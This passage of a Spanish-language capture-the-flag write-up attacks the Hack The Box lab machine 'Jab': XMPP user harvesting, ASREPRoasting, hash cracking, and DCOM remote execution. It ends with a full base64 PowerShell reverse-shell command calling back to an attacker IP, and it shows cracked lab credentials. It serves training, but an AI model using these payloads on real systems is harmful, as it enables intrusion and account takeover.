+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2205
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2204
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2206
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2211
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2239
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2255
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2256
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2309
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2330
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2354
+</span></span><span style="display:flex;"><span>supportedCapabilities: 1.2.840.113556.1.4.800
+</span></span><span style="display:flex;"><span>supportedCapabilities: 1.2.840.113556.1.4.1670
+</span></span><span style="display:flex;"><span>supportedCapabilities: 1.2.840.113556.1.4.1791
+</span></span><span style="display:flex;"><span>supportedCapabilities: 1.2.840.113556.1.4.1935
+</span></span><span style="display:flex;"><span>supportedCapabilities: 1.2.840.113556.1.4.2080
+</span></span><span style="display:flex;"><span>supportedCapabilities: 1.2.840.113556.1.4.2237
+</span></span><span style="display:flex;"><span>subschemaSubentry: CN<span style="color:#f92672">=</span>Aggregate,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>jab,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>serverName: CN<span style="color:#f92672">=</span>DC01,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configur
+</span></span><span style="display:flex;"><span> ation,DC<span style="color:#f92672">=</span>jab,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>schemaNamingContext: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>jab,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>namingContexts: DC<span style="color:#f92672">=</span>jab,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>namingContexts: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>jab,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>namingContexts: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>jab,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>namingContexts: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>jab,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>namingContexts: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>jab,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>isSynchronized: TRUE
+</span></span><span style="display:flex;"><span>highestCommittedUSN: <span style="color:#ae81ff">266344</span>
+</span></span><span style="display:flex;"><span>dsServiceName: CN<span style="color:#f92672">=</span>NTDS Settings,CN<span style="color:#f92672">=</span>DC01,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,
+</span></span><span style="display:flex;"><span> CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>jab,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>dnsHostName: DC01.jab.htb
+</span></span><span style="display:flex;"><span>defaultNamingContext: DC<span style="color:#f92672">=</span>jab,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>currentTime: 20240803152352.0Z
+</span></span><span style="display:flex;"><span>configurationNamingContext: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>jab,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># search result</span>
+</span></span><span style="display:flex;"><span>search: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>result: <span style="color:#ae81ff">0</span> Success
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># numResponses: 2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># numEntries: 1</span>
+</span></span></code></pre></div><h1 id="enumerating-xmpp">Enumerating XMPP</h1>
+<p>Vamos a instalar un client XMPP. Desde la página de <a href="https://jabber.at/clients/">Jabber</a> se recomienda varios así que me he decidido por <code>Gajim</code></p>
+<p><code>$ sudo apt-get install gajim</code></p>
+<p>Intentando crear una cuenta..
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p><img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>Probando el dominio..
+<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<p><img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<p>Para evitar problemas, voy a desactivar el usar conexiones encriptadas, así no utilizaremos el SSL y no me dará problemas ya que es un certificado autofirmado.
+<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Si nos dirigimos a <code>Acconts -&gt; Discover Services</code></p>
+<p>Vemos varios servicios.
+<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+<p>Si nos dirigimos al servicio de <code>User Search</code>y introducimos una wildcard conseguimos muchos usuarios que nos pueden venir para enumerar el protocolo de Kerberos.
+<img src="images/Screenshot_7.png" alt="Write-up Image">
+<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
+<p>El problema es que no podemos copiar y pegar rápidamente..</p>
+<p>Además son muchos usuarios, por lo cual podría cambiar de cliente XMPP buscando alguno que tenga una función para poder exportar, o debug&hellip;</p>
+<p>¿Pero para que, si tenemos python?</p>
+<p>Primero vemos como se tramita la data en <code>wireshark</code> y podemos ver que se tramita en varios paquetes en un XML gigante.
+<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
+<p>Este es el script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> sniff, TCP, IP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> signal
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>users <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">save_to_file</span>(x,y):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Eliminando repetidos..</span>
+</span></span><span style="display:flex;"><span>    users_list <span style="color:#f92672">=</span> list(set(users))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[!] Guardando </span><span style="color:#e6db74">%i</span><span style="color:#e6db74"> usuarios y saliendo...&#34;</span> <span style="color:#f92672">%</span> len(users_list))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;users.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> txt:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> users_list:
+</span></span><span style="display:flex;"><span>            txt<span style="color:#f92672">.</span>write(user <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>signal<span style="color:#f92672">.</span>signal(signal<span style="color:#f92672">.</span>SIGINT, save_to_file)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">packet_callback</span>(packet):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> packet<span style="color:#f92672">.</span>haslayer(TCP):
+</span></span><span style="display:flex;"><span>        ip_layer <span style="color:#f92672">=</span> packet[IP]
+</span></span><span style="display:flex;"><span>        tcp_layer <span style="color:#f92672">=</span> packet[TCP]
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> bytes(tcp_layer<span style="color:#f92672">.</span>payload)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> data:
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print(f&#34;[{ip_layer.src}:{tcp_layer.sport} -&gt; {ip_layer.dst}:{tcp_layer.dport}] {data}&#34;)</span>
+</span></span><span style="display:flex;"><span>            pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;&lt;value&gt;(.*?)&lt;&#39;</span>
+</span></span><span style="display:flex;"><span>            matches <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(pattern,data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">match</span> <span style="color:#f92672">in</span> matches:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;@&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> <span style="color:#66d9ef">match</span> <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> <span style="color:#66d9ef">match</span> <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>isnumeric():
+</span></span><span style="display:flex;"><span>                    users<span style="color:#f92672">.</span>append(<span style="color:#66d9ef">match</span>)
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">&#34;[i] Found </span><span style="color:#e6db74">%i</span><span style="color:#e6db74"> users&#34;</span> <span style="color:#f92672">%</span> len(users))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Sniff TCP packets on interface tun0</span>
+</span></span><span style="display:flex;"><span>    interface <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;tun0&#34;</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Sniffing TCP packets on </span><span style="color:#e6db74">{</span>interface<span style="color:#e6db74">}</span><span style="color:#e6db74">...&#34;</span>)
+</span></span><span style="display:flex;"><span>    sniff(filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tcp&#34;</span>, iface<span style="color:#f92672">=</span>interface, prn<span style="color:#f92672">=</span>packet_callback, store<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>Simple pero nos sirve, simplemente captura el tráfico TCP por <code>tun0</code> y aplica una expresión regular para quedarse con la data dentro de <code>&lt;value&gt;DATA&lt;</code>. Luego nos quedamos con los que no contengan espacios ni <code>@</code> , de esta forma nos quedamos con algunos falsos positivos y con los usuarios.</p>
+<p>Mientras estamos ejecutando el script, ejecutamos varias veces la consulta de usuarios para asegurar que no se nos olvida ninguno, al guardar el archivo se eliminan repetidos así que perfecto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo python3 sniff.py 
+</span></span><span style="display:flex;"><span>Sniffing TCP packets on tun0...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">2</span> users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">3</span> users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">4</span> users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">5</span> users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">6</span> users
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">3247</span> users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">3248</span> users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">3249</span> users
+</span></span><span style="display:flex;"><span>^C<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Guardando <span style="color:#ae81ff">2118</span> usuarios y saliendo...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat users.txt  | head -n <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>aworrell
+</span></span><span style="display:flex;"><span>astuart
+</span></span><span style="display:flex;"><span>mfulk
+</span></span><span style="display:flex;"><span>econdie
+</span></span><span style="display:flex;"><span>anellis
+</span></span><span style="display:flex;"><span>gnolte
+</span></span></code></pre></div><p>Ahora, podemos confirmar cuantos usuarios son válidos con <code>kerbrute</code>
+<code>$ /opt/kerbrute userenum --dc 10.129.230.215 -d jab.htb users.txt</code></p>
+<p><code>2024/08/03 20:11:52 &gt;  Done! Tested 2117 usernames (2112 valid) in 9.794 seconds</code></p>
+<p>Ahora parseamos los usuarios exportados.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rm users.txt 
+</span></span><span style="display:flex;"><span>rm: remove write-protected regular file <span style="color:#e6db74">&#39;users.txt&#39;</span>? y
+</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/jab/content<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ cat valid_users.txt | awk <span style="color:#e6db74">&#39;{print $7}&#39;</span> | cut -d<span style="color:#e6db74">&#39;@&#39;</span> -f1 &gt; users.txt
+</span></span></code></pre></div><h1 id="asreproast">ASREPRoast</h1>
+<p>Ahora que tenemos una lista de usuarios, podemos con <code>impacket-GetNPUsers</code> ejecutar un ataque de tipo <code>ASREPRoast</code> para obtener hashes de los tickets TGT y crackearlos.</p>
+<p><code>impacket-GetNPUsers -no-pass -usersfile users.txt jab.htb/ -o hashes</code></p>
+<p>¡Y obtenemos algunos hashes!</p>
+<ul>
+<li>lbradford</li>
+<li>jmontgomery</li>
+<li>mlowe</li>
+</ul>
+<h1 id="cracking-the-hashes">Cracking the hashes</h1>
+<pre tabindex="0"><code>$ john -w=/usr/share/wordlists/rockyou.txt hashes
+...
+Midnight_121     ($krb5asrep$23$jmontgomery@JAB.HTB) 
+</code></pre><p>Solo he conseguido crackear ese TGT.</p>
+<p>Con <code>netexec</code> podemos confirmar estas credenciales.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nxc smb 10.129.230.215 -u <span style="color:#e6db74">&#39;jmontgomery&#39;</span> -p <span style="color:#e6db74">&#39;Midnight_121&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.230.215  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:jab.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.230.215  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> jab.htb<span style="color:#ae81ff">\j</span>montgomery:Midnight_121
+</span></span></code></pre></div><h1 id="bloodhound-python">Bloodhound Python</h1>
+<p>Lo primero que se me ocurrió es con <code>bloodhound-python</code> podemos hacer una enumeración para ver si tenemos algún privilegio sobre otros objetos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ bloodhound-python -ns 10.129.230.215 -dc dc01.jab.htb -d jab.htb -c All -u <span style="color:#e6db74">&#39;jmontgomery&#39;</span> -p <span style="color:#e6db74">&#39;Midnight_121&#39;</span>
+</span></span></code></pre></div><p><img src="images/Screenshot_10.png" alt="Write-up Image"></p>
+<p>Ahora lo importamos al <code>bloodhound</code></p>
+<p>Vemos que pertenece a un grupo <code>Contractors</code> pero no vemos nada interesante.
+<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
+<h1 id="obtaining-svc_openfire-credentials">Obtaining svc_openfire credentials</h1>
+<p>Así que después de un rato, intenté iniciar sesión en el XMPP como este usuario.
+<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
+<p>También vemos que este usuario tiene una foto de perfil de <code>kali linux</code> por lo cual podemos deducir que a lo mejor tiene algo que ver con la ciberseguridad de la empresa.
+<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
+<p>Buscando las conferencias, vemos un grupo interesante.
+<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
+<p>No veo nada&hellip;
+<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
+<p>Investigando un poco, decidí cambiar de cliente XMPP porque había alcanzado un punto muerto donde poca cosa podía hacer.</p>
+<p>Instalé <code>pidgin</code> otro cliente recomendado desde <code>jabber.at</code></p>
+<p>Configuramos la cuenta de usuario..
+<img src="images/Screenshot_17.png" alt="Write-up Image"></p>
+<p>Vemos la sala, nos unimos..
+<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
+<p>Y ahora sí vemos algo&hellip; Vemos un hash crackeado para la cuenta <code>svc_openfire</code>
+<img src="images/Screenshot_19.png" alt="Write-up Image"><code>svc_openfire:!@#$%^&amp;*(1qazxsw</code></p>
+<p>Podemos comprobar estas credenciales</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb 10.129.230.215 -u <span style="color:#e6db74">&#39;svc_openfire&#39;</span> -p <span style="color:#e6db74">&#39;!@#$%^&amp;*(1qazxsw&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.230.215  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:jab.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.230.215  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> jab.htb<span style="color:#ae81ff">\s</span>vc_openfire:!@#$%^&amp;*<span style="color:#f92672">(</span>1qazxsw
+</span></span></code></pre></div><h1 id="getting-foothold">Getting Foothold</h1>
+<p>Ahora volvemos al <code>bloodhound</code> y establecemos como Owned esta cuenta de usuario.</p>
+<p>Vemos que este usuario pertenece al grupo <code>Distributed COM Users</code> en DC01.JAB.HTB. Se podría acontecer ejecución de código si se cumplen ciertas condiciones.
+<img src="images/Screenshot_20.png" alt="Write-up Image"></p>
+<p>Viendo este <a href="https://medium.com/@iamkumarraj/exploring-impacket-dcomexec-enhancing-active-directory-attack-capabilities-a9663d383703">post</a> en medium, conseguí ejecución remota de comandos probando varios comandos&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ impacket-dcomexec -object MMC20 jab.htb/svc_openfire:<span style="color:#e6db74">&#39;!@#$%^&amp;*(1qazxsw&#39;</span>@dc01.jab.htb <span style="color:#e6db74">&#39;ping 10.10.14.80&#39;</span> -debug -silentcommand
+</span></span><span style="display:flex;"><span>Impacket v0.11.0 - Copyright <span style="color:#ae81ff">2023</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Target system is dc01.jab.htb and isFQDN is True
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> StringBinding: DC01<span style="color:#f92672">[</span>60242<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> StringBinding chosen: ncacn_ip_tcp:dc01.jab.htb<span style="color:#f92672">[</span>60242<span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo tcpdump -i tun0 icmp
+</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v<span style="color:#f92672">[</span>v<span style="color:#f92672">]</span>... <span style="color:#66d9ef">for</span> full protocol decode
+</span></span><span style="display:flex;"><span>listening on tun0, link-type RAW <span style="color:#f92672">(</span>Raw IP<span style="color:#f92672">)</span>, snapshot length <span style="color:#ae81ff">262144</span> bytes
+</span></span><span style="display:flex;"><span>21:02:15.015723 IP dc01.jab.htb &gt; 10.10.14.80: ICMP echo request, id 1, seq 165, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>21:02:15.015865 IP 10.10.14.80 &gt; dc01.jab.htb: ICMP echo reply, id 1, seq 165, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>21:02:16.023460 IP dc01.jab.htb &gt; 10.10.14.80: ICMP echo request, id 1, seq 166, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>21:02:16.023492 IP 10.10.14.80 &gt; dc01.jab.htb: ICMP echo reply, id 1, seq 166, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>21:02:17.026112 IP dc01.jab.htb &gt; 10.10.14.80: ICMP echo request, id 1, seq 167, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>21:02:17.026142 IP 10.10.14.80 &gt; dc01.jab.htb: ICMP echo reply, id 1, seq 167, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>21:02:18.073972 IP dc01.jab.htb &gt; 10.10.14.80: ICMP echo request, id 1, seq 168, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>21:02:18.073997 IP 10.10.14.80 &gt; dc01.jab.htb: ICMP echo reply, id 1, seq 168, length <span style="color:#ae81ff">40</span>
+</span></span></code></pre></div><p>Ahora con <code>nishang</code>, cogemos la típica reverse shell en powershell, <code>Invoke-PowerShellTcp.ps1</code> y le añadimos esta línea al final del todo.
+<img src="images/Screenshot_21.png" alt="Write-up Image"></p>
+<p>Ahora ofrecemos este archivo por el puerto 8081.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>Nos ponemos en escucha por el puerto 443.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Y no conseguí mandarme la revshell. Así que alternativamente probé el típico payload en base64 con <code>powershell -e</code> y después de ejecutar varias veces el comando, quitando y poniendo el parámetro <code>-silentcommand</code> conseguí la reverse shell.
+<img src="images/Screenshot_22.png" alt="Write-up Image"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ impacket-dcomexec -object MMC20 jab.htb/svc_openfire:<span style="color:#e6db74">&#39;!@#$%^&amp;*(1qazxsw&#39;</span>@dc01.jab.htb <span style="color:#e6db74">&#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&#39;</span> -debug
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp 443
+</span></span><span style="display:flex;"><span>listening on [any] 443 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.80] from (UNKNOWN) [10.129.230.215] 53443
